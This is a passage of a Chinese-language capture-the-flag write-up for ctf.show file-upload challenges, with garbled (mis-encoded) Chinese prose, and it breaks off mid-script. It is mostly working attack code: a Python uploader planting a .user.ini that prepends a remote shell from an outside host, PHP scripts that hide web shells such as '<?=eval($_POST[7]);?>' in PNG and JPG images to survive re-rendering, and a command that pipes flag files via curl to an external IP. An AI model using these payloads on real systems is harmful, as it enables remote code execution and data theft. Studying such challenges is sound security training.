</span></span><span class="line"><span class="ln"> 5</span><span class="cl">    <span class="n">burp1_url</span> <span class="o">=</span> <span class="s2">&#34;http://3de6e682-59e3-489c-8e72-2b74e3db5058.challenge.ctf.show/upload/&#34;</span>
</span></span><span class="line"><span class="ln"> 6</span><span class="cl">    <span class="n">burp0_headers</span> <span class="o">=</span> <span class="p">{</span><span class="s2">&#34;Sec-Ch-Ua-Platform&#34;</span><span class="p">:</span> <span class="s2">&#34;</span><span class="se">\&#34;</span><span class="s2">Windows</span><span class="se">\&#34;</span><span class="s2">&#34;</span><span class="p">,</span> <span class="s2">&#34;Accept-Language&#34;</span><span class="p">:</span> <span class="s2">&#34;zh-CN,zh;q=0.9&#34;</span><span class="p">,</span> <span class="s2">&#34;Sec-Ch-Ua&#34;</span><span class="p">:</span> <span class="s2">&#34;</span><span class="se">\&#34;</span><span class="s2">Not?A_Brand</span><span class="se">\&#34;</span><span class="s2">;v=</span><span class="se">\&#34;</span><span class="s2">99</span><span class="se">\&#34;</span><span class="s2">, </span><span class="se">\&#34;</span><span class="s2">Chromium</span><span class="se">\&#34;</span><span class="s2">;v=</span><span class="se">\&#34;</span><span class="s2">130</span><span class="se">\&#34;</span><span class="s2">&#34;</span><span class="p">,</span> <span class="s2">&#34;Sec-Ch-Ua-Mobile&#34;</span><span class="p">:</span> <span class="s2">&#34;?0&#34;</span><span class="p">,</span> <span class="s2">&#34;X-Requested-With&#34;</span><span class="p">:</span> <span class="s2">&#34;XMLHttpRequest&#34;</span><span class="p">,</span> <span class="s2">&#34;User-Agent&#34;</span><span class="p">:</span> <span class="s2">&#34;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.70 Safari/537.36&#34;</span><span class="p">,</span> <span class="s2">&#34;Accept&#34;</span><span class="p">:</span> <span class="s2">&#34;application/json, text/javascript, */*; q=0.01&#34;</span><span class="p">,</span> <span class="s2">&#34;Content-Type&#34;</span><span class="p">:</span> <span class="s2">&#34;multipart/form-data; boundary=----WebKitFormBoundaryBcDoqZWhQP52WEA6&#34;</span><span class="p">,</span> <span class="s2">&#34;Origin&#34;</span><span class="p">:</span> <span class="s2">&#34;https://938b9a73-97ad-4b15-81d8-0101678e16f8.challenge.ctf.show&#34;</span><span class="p">,</span> <span class="s2">&#34;Sec-Fetch-Site&#34;</span><span class="p">:</span> <span class="s2">&#34;same-origin&#34;</span><span class="p">,</span> <span class="s2">&#34;Sec-Fetch-Mode&#34;</span><span class="p">:</span> <span class="s2">&#34;cors&#34;</span><span class="p">,</span> <span class="s2">&#34;Sec-Fetch-Dest&#34;</span><span class="p">:</span> <span class="s2">&#34;empty&#34;</span><span class="p">,</span> <span class="s2">&#34;Referer&#34;</span><span class="p">:</span> <span class="s2">&#34;https://938b9a73-97ad-4b15-81d8-0101678e16f8.challenge.ctf.show/&#34;</span><span class="p">,</span> <span class="s2">&#34;Accept-Encoding&#34;</span><span class="p">:</span> <span class="s2">&#34;gzip, deflate, br&#34;</span><span class="p">,</span> <span class="s2">&#34;Priority&#34;</span><span class="p">:</span> <span class="s2">&#34;u=1, i&#34;</span><span class="p">,</span> <span class="s2">&#34;Connection&#34;</span><span class="p">:</span> <span class="s2">&#34;keep-alive&#34;</span><span class="p">}</span>
</span></span><span class="line"><span class="ln"> 7</span><span class="cl">    <span class="n">burp0_data</span> <span class="o">=</span> <span class="s2">&#34;------WebKitFormBoundaryBcDoqZWhQP52WEA6</span><span class="se">\r\n</span><span class="s2">Content-Disposition: form-data; name=</span><span class="se">\&#34;</span><span class="s2">file</span><span class="se">\&#34;</span><span class="s2">; filename=</span><span class="se">\&#34;</span><span class="s2">.user.ini</span><span class="se">\&#34;\r\n</span><span class="s2">Content-Type: image/png</span><span class="se">\r\n\r\n</span><span class="s2">GIF89a</span><span class="se">\r\n</span><span class="s2">auto_prepend_file=http://é•¿æ•´å‹ip:7777/shell</span><span class="se">\r\n</span><span class="s2">------WebKitFormBoundaryBcDoqZWhQP52WEA6--</span><span class="se">\r\n</span><span class="s2">&#34;</span>
</span></span><span class="line"><span class="ln"> 8</span><span class="cl">    <span class="n">log</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">burp0_url</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">burp0_headers</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">burp0_data</span><span class="p">)</span>
</span></span><span class="line"><span class="ln"> 9</span><span class="cl">    <span class="n">log1</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">burp1_url</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">10</span><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="n">log</span><span class="o">.</span><span class="n">status_code</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">11</span><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">12</span><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="n">log1</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl">    <span class="k">if</span> <span class="s2">&#34;ctfshow&#34;</span> <span class="ow">in</span> <span class="n">log1</span><span class="o">.</span><span class="n">text</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">14</span><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;getflag&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl">        <span class="k">break</span>
</span></span></code></pre></div><p><img alt="image-20250127183202416" loading="lazy" src="./assets/image-20250127183202416.png"></p>
<h4 id="web164">web164<a hidden class="anchor" aria-hidden="true" href="#web164">#</a></h4>
<p><img alt="image-20250127194845782" loading="lazy" src="./assets/image-20250127194845782.png"></p>
<p>è¿™é¢˜éšä¾¿ä¼ ä¸ªå›¾ç‰‡è¯•è¯•å‘ç°å¤šäº†ä¸ªæŸ¥çœ‹å›¾ç‰‡</p>
<pre tabindex="0"><code>https://775e9cd3-3a73-47a1-b31d-7b4450ec5573.challenge.ctf.show/download.php?image=94f7678cc4cda39c02c7890bc8fe6941.png
</code></pre><p><img alt="image-20250127194925361" loading="lazy" src="./assets/image-20250127194925361.png"></p>
<p>ä»urlæˆ‘ä»¬å¯ä»¥çœ‹å‡ºè¿™é¢˜å­˜åœ¨å›¾ç‰‡åŒ…å«</p>
<p>æˆ‘ä»¬å¯ä»¥åˆ©ç”¨è¿™ä¸ªæ–‡ä»¶åŒ…å«å»æ‰§è¡Œæˆ‘ä»¬çš„å›¾ç‰‡é©¬</p>
<p>å¤§ä½¬çš„è„šæœ¬ï¼Œå¯ä»¥ç»•è¿‡äºŒæ¬¡æ¸²æŸ“</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl"><span class="nv">$p</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="mh">0xa3</span><span class="p">,</span> <span class="mh">0x9f</span><span class="p">,</span> <span class="mh">0x67</span><span class="p">,</span> <span class="mh">0xf7</span><span class="p">,</span> <span class="mh">0x0e</span><span class="p">,</span> <span class="mh">0x93</span><span class="p">,</span> <span class="mh">0x1b</span><span class="p">,</span> <span class="mh">0x23</span><span class="p">,</span>
</span></span><span class="line"><span class="ln"> 3</span><span class="cl">           <span class="mh">0xbe</span><span class="p">,</span> <span class="mh">0x2c</span><span class="p">,</span> <span class="mh">0x8a</span><span class="p">,</span> <span class="mh">0xd0</span><span class="p">,</span> <span class="mh">0x80</span><span class="p">,</span> <span class="mh">0xf9</span><span class="p">,</span> <span class="mh">0xe1</span><span class="p">,</span> <span class="mh">0xae</span><span class="p">,</span>
</span></span><span class="line"><span class="ln"> 4</span><span class="cl">           <span class="mh">0x22</span><span class="p">,</span> <span class="mh">0xf6</span><span class="p">,</span> <span class="mh">0xd9</span><span class="p">,</span> <span class="mh">0x43</span><span class="p">,</span> <span class="mh">0x5d</span><span class="p">,</span> <span class="mh">0xfb</span><span class="p">,</span> <span class="mh">0xae</span><span class="p">,</span> <span class="mh">0xcc</span><span class="p">,</span>
</span></span><span class="line"><span class="ln"> 5</span><span class="cl">           <span class="mh">0x5a</span><span class="p">,</span> <span class="mh">0x01</span><span class="p">,</span> <span class="mh">0xdc</span><span class="p">,</span> <span class="mh">0x5a</span><span class="p">,</span> <span class="mh">0x01</span><span class="p">,</span> <span class="mh">0xdc</span><span class="p">,</span> <span class="mh">0xa3</span><span class="p">,</span> <span class="mh">0x9f</span><span class="p">,</span>
</span></span><span class="line"><span class="ln"> 6</span><span class="cl">           <span class="mh">0x67</span><span class="p">,</span> <span class="mh">0xa5</span><span class="p">,</span> <span class="mh">0xbe</span><span class="p">,</span> <span class="mh">0x5f</span><span class="p">,</span> <span class="mh">0x76</span><span class="p">,</span> <span class="mh">0x74</span><span class="p">,</span> <span class="mh">0x5a</span><span class="p">,</span> <span class="mh">0x4c</span><span class="p">,</span>
</span></span><span class="line"><span class="ln"> 7</span><span class="cl">           <span class="mh">0xa1</span><span class="p">,</span> <span class="mh">0x3f</span><span class="p">,</span> <span class="mh">0x7a</span><span class="p">,</span> <span class="mh">0xbf</span><span class="p">,</span> <span class="mh">0x30</span><span class="p">,</span> <span class="mh">0x6b</span><span class="p">,</span> <span class="mh">0x88</span><span class="p">,</span> <span class="mh">0x2d</span><span class="p">,</span>
</span></span><span class="line"><span class="ln"> 8</span><span class="cl">           <span class="mh">0x60</span><span class="p">,</span> <span class="mh">0x65</span><span class="p">,</span> <span class="mh">0x7d</span><span class="p">,</span> <span class="mh">0x52</span><span class="p">,</span> <span class="mh">0x9d</span><span class="p">,</span> <span class="mh">0xad</span><span class="p">,</span> <span class="mh">0x88</span><span class="p">,</span> <span class="mh">0xa1</span><span class="p">,</span>
</span></span><span class="line"><span class="ln"> 9</span><span class="cl">           <span class="mh">0x66</span><span class="p">,</span> <span class="mh">0x44</span><span class="p">,</span> <span class="mh">0x50</span><span class="p">,</span> <span class="mh">0x33</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">10</span><span class="cl">
</span></span><span class="line"><span class="ln">11</span><span class="cl">
</span></span><span class="line"><span class="ln">12</span><span class="cl">
</span></span><span class="line"><span class="ln">13</span><span class="cl"><span class="nv">$img</span> <span class="o">=</span> <span class="nx">imagecreatetruecolor</span><span class="p">(</span><span class="mi">32</span><span class="p">,</span> <span class="mi">32</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">14</span><span class="cl">
</span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="k">for</span> <span class="p">(</span><span class="nv">$y</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nv">$y</span> <span class="o">&lt;</span> <span class="nx">sizeof</span><span class="p">(</span><span class="nv">$p</span><span class="p">);</span> <span class="nv">$y</span> <span class="o">+=</span> <span class="mi">3</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">   <span class="nv">$r</span> <span class="o">=</span> <span class="nv">$p</span><span class="p">[</span><span class="nv">$y</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">   <span class="nv">$g</span> <span class="o">=</span> <span class="nv">$p</span><span class="p">[</span><span class="nv">$y</span><span class="o">+</span><span class="mi">1</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">   <span class="nv">$b</span> <span class="o">=</span> <span class="nv">$p</span><span class="p">[</span><span class="nv">$y</span><span class="o">+</span><span class="mi">2</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">   <span class="nv">$color</span> <span class="o">=</span> <span class="nx">imagecolorallocate</span><span class="p">(</span><span class="nv">$img</span><span class="p">,</span> <span class="nv">$r</span><span class="p">,</span> <span class="nv">$g</span><span class="p">,</span> <span class="nv">$b</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl">   <span class="nx">imagesetpixel</span><span class="p">(</span><span class="nv">$img</span><span class="p">,</span> <span class="nx">round</span><span class="p">(</span><span class="nv">$y</span> <span class="o">/</span> <span class="mi">3</span><span class="p">),</span> <span class="mi">0</span><span class="p">,</span> <span class="nv">$color</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl">
</span></span><span class="line"><span class="ln">23</span><span class="cl"><span class="nx">imagepng</span><span class="p">(</span><span class="nv">$img</span><span class="p">,</span><span class="s1">&#39;./1.png&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">24</span><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></div><pre tabindex="0"><code>å›¾ç‰‡é©¬çš„å†…å®¹ &lt;?$_GET[0]($_POST[1]);?&gt;
</code></pre><p>æ²¡æœ‰å›æ˜¾</p>
<p>å¤–å¸¦è¯»flag</p>
<pre tabindex="0"><code>POST 1=cat f* | curl -X POST -d @- http://106.55.168.231:7777/
GET 0=system
</code></pre><h4 id="web165">web165<a hidden class="anchor" aria-hidden="true" href="#web165">#</a></h4>
<p>è¿™é¢˜è€ƒå¯Ÿçš„ä¹Ÿæ˜¯å›¾ç‰‡é©¬ï¼Œä½†æ˜¯æ˜¯ç”¨jpgçš„å›¾ç‰‡é©¬ç»•è¿‡äºŒæ¬¡æ¸²æŸ“</p>
<p>å¤§ä½¬çš„è„šæœ¬</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln">  1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln">  2</span><span class="cl">    <span class="cm">/*
</span></span></span><span class="line"><span class="ln">  3</span><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="ln">  4</span><span class="cl"><span class="cm">    The algorithm of injecting the payload into the JPG image, which will keep unchanged after transformations caused by PHP functions imagecopyresized() and imagecopyresampled().
</span></span></span><span class="line"><span class="ln">  5</span><span class="cl"><span class="cm">    It is necessary that the size and quality of the initial image are the same as those of the processed image.
</span></span></span><span class="line"><span class="ln">  6</span><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="ln">  7</span><span class="cl"><span class="cm">    1) Upload an arbitrary image via secured files upload script
</span></span></span><span class="line"><span class="ln">  8</span><span class="cl"><span class="cm">    2) Save the processed image and launch:
</span></span></span><span class="line"><span class="ln">  9</span><span class="cl"><span class="cm">    jpg_payload.php &lt;jpg_name.jpg&gt;
</span></span></span><span class="line"><span class="ln"> 10</span><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="ln"> 11</span><span class="cl"><span class="cm">    In case of successful injection you will get a specially crafted image, which should be uploaded again.
</span></span></span><span class="line"><span class="ln"> 12</span><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="ln"> 13</span><span class="cl"><span class="cm">    Since the most straightforward injection method is used, the following problems can occur:
</span></span></span><span class="line"><span class="ln"> 14</span><span class="cl"><span class="cm">    1) After the second processing the injected data may become partially corrupted.
</span></span></span><span class="line"><span class="ln"> 15</span><span class="cl"><span class="cm">    2) The jpg_payload.php script outputs &#34;Something&#39;s wrong&#34;.
</span></span></span><span class="line"><span class="ln"> 16</span><span class="cl"><span class="cm">    If this happens, try to change the payload (e.g. add some symbols at the beginning) or try another initial image.
</span></span></span><span class="line"><span class="ln"> 17</span><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="ln"> 18</span><span class="cl"><span class="cm">    Sergey Bobrov @Black2Fan.
</span></span></span><span class="line"><span class="ln"> 19</span><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="ln"> 20</span><span class="cl"><span class="cm">    See also:
</span></span></span><span class="line"><span class="ln"> 21</span><span class="cl"><span class="cm">    https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/
</span></span></span><span class="line"><span class="ln"> 22</span><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="ln"> 23</span><span class="cl"><span class="cm">    */</span>
</span></span><span class="line"><span class="ln"> 24</span><span class="cl">		
</span></span><span class="line"><span class="ln"> 25</span><span class="cl">    <span class="nv">$miniPayload</span> <span class="o">=</span> <span class="s2">&#34;&lt;?=eval(</span><span class="se">\$</span><span class="s2">_POST[7]);?&gt;&#34;</span><span class="p">;</span> <span class="c1">//æ³¨æ„$è½¬ä¹‰
</span></span></span><span class="line"><span class="ln"> 26</span><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="ln"> 27</span><span class="cl">
</span></span><span class="line"><span class="ln"> 28</span><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">extension_loaded</span><span class="p">(</span><span class="s1">&#39;gd&#39;</span><span class="p">)</span> <span class="o">||</span> <span class="o">!</span><span class="nx">function_exists</span><span class="p">(</span><span class="s1">&#39;imagecreatefromjpeg&#39;</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="ln"> 29</span><span class="cl">        <span class="k">die</span><span class="p">(</span><span class="s1">&#39;php-gd is not installed&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln"> 30</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln"> 31</span><span class="cl">
</span></span><span class="line"><span class="ln"> 32</span><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]))</span> <span class="p">{</span>
</span></span><span class="line"><span class="ln"> 33</span><span class="cl">        <span class="k">die</span><span class="p">(</span><span class="s1">&#39;php jpg_payload.php &lt;jpg_name.jpg&gt;&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln"> 34</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln"> 35</span><span class="cl">
</span></span><span class="line"><span class="ln"> 36</span><span class="cl">    <span class="nx">set_error_handler</span><span class="p">(</span><span class="s2">&#34;custom_error_handler&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln"> 37</span><span class="cl">
</span></span><span class="line"><span class="ln"> 38</span><span class="cl">    <span class="k">for</span><span class="p">(</span><span class="nv">$pad</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nv">$pad</span> <span class="o">&lt;</span> <span class="mi">1024</span><span class="p">;</span> <span class="nv">$pad</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="ln"> 39</span><span class="cl">        <span class="nv">$nullbytePayloadSize</span> <span class="o">=</span> <span class="nv">$pad</span><span class="p">;</span>
</span></span><span class="line"><span class="ln"> 40</span><span class="cl">        <span class="nv">$dis</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">DataInputStream</span><span class="p">(</span><span class="nv">$argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
</span></span><span class="line"><span class="ln"> 41</span><span class="cl">        <span class="nv">$outStream</span> <span class="o">=</span> <span class="nx">file_get_contents</span><span class="p">(</span><span class="nv">$argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
</span></span><span class="line"><span class="ln"> 42</span><span class="cl">        <span class="nv">$extraBytes</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="ln"> 43</span><span class="cl">        <span class="nv">$correctImage</span> <span class="o">=</span> <span class="k">TRUE</span><span class="p">;</span>
</span></span><span class="line"><span class="ln"> 44</span><span class="cl">
</span></span><span class="line"><span class="ln"> 45</span><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="nv">$dis</span><span class="o">-&gt;</span><span class="na">readShort</span><span class="p">()</span> <span class="o">!=</span> <span class="mh">0xFFD8</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="ln"> 46</span><span class="cl">            <span class="k">die</span><span class="p">(</span><span class="s1">&#39;Incorrect SOI marker&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln"> 47</span><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="ln"> 48</span><span class="cl">
</span></span><span class="line"><span class="ln"> 49</span><span class="cl">        <span class="k">while</span><span class="p">((</span><span class="o">!</span><span class="nv">$dis</span><span class="o">-&gt;</span><span class="na">eof</span><span class="p">())</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="nv">$dis</span><span class="o">-&gt;</span><span class="na">readByte</span><span class="p">()</span> <span class="o">==</span> <span class="mh">0xFF</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="ln"> 50</span><span class="cl">            <span class="nv">$marker</span> <span class="o">=</span> <span class="nv">$dis</span><span class="o">-&gt;</span><span class="na">readByte</span><span class="p">();</span>
</span></span><span class="line"><span class="ln"> 51</span><span class="cl">            <span class="nv">$size</span> <span class="o">=</span> <span class="nv">$dis</span><span class="o">-&gt;</span><span class="na">readShort</span><span class="p">()</span> <span class="o">-</span> <span class="mi">2</span><span class="p">;</span>
</span></span><span class="line"><span class="ln"> 52</span><span class="cl">            <span class="nv">$dis</span><span class="o">-&gt;</span><span class="na">skip</span><span class="p">(</span><span class="nv">$size</span><span class="p">);</span>
</span></span><span class="line"><span class="ln"> 53</span><span class="cl">            <span class="k">if</span><span class="p">(</span><span class="nv">$marker</span> <span class="o">===</span> <span class="mh">0xDA</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="ln"> 54</span><span class="cl">                <span class="nv">$startPos</span> <span class="o">=</span> <span class="nv">$dis</span><span class="o">-&gt;</span><span class="na">seek</span><span class="p">();</span>
</span></span><span class="line"><span class="ln"> 55</span><span class="cl">                <span class="nv">$outStreamTmp</span> <span class="o">=</span> 
</span></span><span class="line"><span class="ln"> 56</span><span class="cl">                    <span class="nx">substr</span><span class="p">(</span><span class="nv">$outStream</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="nv">$startPos</span><span class="p">)</span> <span class="o">.</span> 
</span></span><span class="line"><span class="ln"> 57</span><span class="cl">                    <span class="nv">$miniPayload</span> <span class="o">.</span> 
</span></span><span class="line"><span class="ln"> 58</span><span class="cl">                    <span class="nx">str_repeat</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\0</span><span class="s2">&#34;</span><span class="p">,</span><span class="nv">$nullbytePayloadSize</span><span class="p">)</span> <span class="o">.</span> 
</span></span><span class="line"><span class="ln"> 59</span><span class="cl">                    <span class="nx">substr</span><span class="p">(</span><span class="nv">$outStream</span><span class="p">,</span> <span class="nv">$startPos</span><span class="p">);</span>
</span></span><span class="line"><span class="ln"> 60</span><span class="cl">                <span class="nx">checkImage</span><span class="p">(</span><span class="s1">&#39;_&#39;</span><span class="o">.</span><span class="nv">$argv</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="nv">$outStreamTmp</span><span class="p">,</span> <span class="k">TRUE</span><span class="p">);</span>
</span></span><span class="line"><span class="ln"> 61</span><span class="cl">                <span class="k">if</span><span class="p">(</span><span class="nv">$extraBytes</span> <span class="o">!==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="ln"> 62</span><span class="cl">                    <span class="k">while</span><span class="p">((</span><span class="o">!</span><span class="nv">$dis</span><span class="o">-&gt;</span><span class="na">eof</span><span class="p">()))</span> <span class="p">{</span>
</span></span><span class="line"><span class="ln"> 63</span><span class="cl">                        <span class="k">if</span><span class="p">(</span><span class="nv">$dis</span><span class="o">-&gt;</span><span class="na">readByte</span><span class="p">()</span> <span class="o">===</span> <span class="mh">0xFF</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="ln"> 64</span><span class="cl">                            <span class="k">if</span><span class="p">(</span><span class="nv">$dis</span><span class="o">-&gt;</span><span class="na">readByte</span> <span class="o">!==</span> <span class="mh">0x00</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="ln"> 65</span><span class="cl">                                <span class="k">break</span><span class="p">;</span>
</span></span><span class="line"><span class="ln"> 66</span><span class="cl">                            <span class="p">}</span>
</span></span><span class="line"><span class="ln"> 67</span><span class="cl">                        <span class="p">}</span>
</span></span><span class="line"><span class="ln"> 68</span><span class="cl">                    <span class="p">}</span>
</span></span><span class="line"><span class="ln"> 69</span><span class="cl">                    <span class="nv">$stopPos</span> <span class="o">=</span> <span class="nv">$dis</span><span class="o">-&gt;</span><span class="na">seek</span><span class="p">()</span> <span class="o">-</span> <span class="mi">2</span><span class="p">;</span>
</span></span><span class="line"><span class="ln"> 70</span><span class="cl">                    <span class="nv">$imageStreamSize</span> <span class="o">=</span> <span class="nv">$stopPos</span> <span class="o">-</span> <span class="nv">$startPos</span><span class="p">;</span>
</span></span><span class="line"><span class="ln"> 71</span><span class="cl">                    <span class="nv">$outStream</span> <span class="o">=</span> 
</span></span><span class="line"><span class="ln"> 72</span><span class="cl">                        <span class="nx">substr</span><span class="p">(</span><span class="nv">$outStream</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="nv">$startPos</span><span class="p">)</span> <span class="o">.</span> 
</span></span><span class="line"><span class="ln"> 73</span><span class="cl">                        <span class="nv">$miniPayload</span> <span class="o">.</span> 
</span></span><span class="line"><span class="ln"> 74</span><span class="cl">                        <span class="nx">substr</span><span class="p">(</span>
</span></span><span class="line"><span class="ln"> 75</span><span class="cl">                            <span class="nx">str_repeat</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\0</span><span class="s2">&#34;</span><span class="p">,</span><span class="nv">$nullbytePayloadSize</span><span class="p">)</span><span class="o">.</span>
</span></span><span class="line"><span class="ln"> 76</span><span class="cl">                                <span class="nx">substr</span><span class="p">(</span><span class="nv">$outStream</span><span class="p">,</span> <span class="nv">$startPos</span><span class="p">,</span> <span class="nv">$imageStreamSize</span><span class="p">),</span>
</span></span><span class="line"><span class="ln"> 77</span><span class="cl">                            <span class="mi">0</span><span class="p">,</span>
</span></span><span class="line"><span class="ln"> 78</span><span class="cl">                            <span class="nv">$nullbytePayloadSize</span><span class="o">+</span><span class="nv">$imageStreamSize</span><span class="o">-</span><span class="nv">$extraBytes</span><span class="p">)</span> <span class="o">.</span> 
</span></span><span class="line"><span class="ln"> 79</span><span class="cl">                                <span class="nx">substr</span><span class="p">(</span><span class="nv">$outStream</span><span class="p">,</span> <span class="nv">$stopPos</span><span class="p">);</span>
</span></span><span class="line"><span class="ln"> 80</span><span class="cl">                <span class="p">}</span> <span class="k">elseif</span><span class="p">(</span><span class="nv">$correctImage</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="ln"> 81</span><span class="cl">                    <span class="nv">$outStream</span> <span class="o">=</span> <span class="nv">$outStreamTmp</span><span class="p">;</span>
</span></span><span class="line"><span class="ln"> 82</span><span class="cl">                <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="ln"> 83</span><span class="cl">                    <span class="k">break</span><span class="p">;</span>
</span></span><span class="line"><span class="ln"> 84</span><span class="cl">                <span class="p">}</span>
</span></span><span class="line"><span class="ln"> 85</span><span class="cl">                <span class="k">if</span><span class="p">(</span><span class="nx">checkImage</span><span class="p">(</span><span class="s1">&#39;payload_&#39;</span><span class="o">.</span><span class="nv">$argv</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="nv">$outStream</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="ln"> 86</span><span class="cl">                    <span class="k">die</span><span class="p">(</span><span class="s1">&#39;Success!&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln"> 87</span><span class="cl">                <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="ln"> 88</span><span class="cl">                    <span class="k">break</span><span class="p">;</span>
</span></span><span class="line"><span class="ln"> 89</span><span class="cl">                <span class="p">}</span>
</span></span><span class="line"><span class="ln"> 90</span><span class="cl">            <span class="p">}</span>
</span></span><span class="line"><span class="ln"> 91</span><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="ln"> 92</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln"> 93</span><span class="cl">    <span class="nx">unlink</span><span class="p">(</span><span class="s1">&#39;payload_&#39;</span><span class="o">.</span><span class="nv">$argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
</span></span><span class="line"><span class="ln"> 94</span><span class="cl">    <span class="k">die</span><span class="p">(</span><span class="s1">&#39;Something\&#39;s wrong&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln"> 95</span><span class="cl">
</span></span><span class="line"><span class="ln"> 96</span><span class="cl">    <span class="k">function</span> <span class="nf">checkImage</span><span class="p">(</span><span class="nv">$filename</span><span class="p">,</span> <span class="nv">$data</span><span class="p">,</span> <span class="nv">$unlink</span> <span class="o">=</span> <span class="k">FALSE</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="ln"> 97</span><span class="cl">        <span class="k">global</span> <span class="nv">$correctImage</span><span class="p">;</span>
</span></span><span class="line"><span class="ln"> 98</span><span class="cl">        <span class="nx">file_put_contents</span><span class="p">(</span><span class="nv">$filename</span><span class="p">,</span> <span class="nv">$data</span><span class="p">);</span>
</span></span><span class="line"><span class="ln"> 99</span><span class="cl">        <span class="nv">$correctImage</span> <span class="o">=</span> <span class="k">TRUE</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">100</span><span class="cl">        <span class="nx">imagecreatefromjpeg</span><span class="p">(</span><span class="nv">$filename</span><span class="p">);</span>
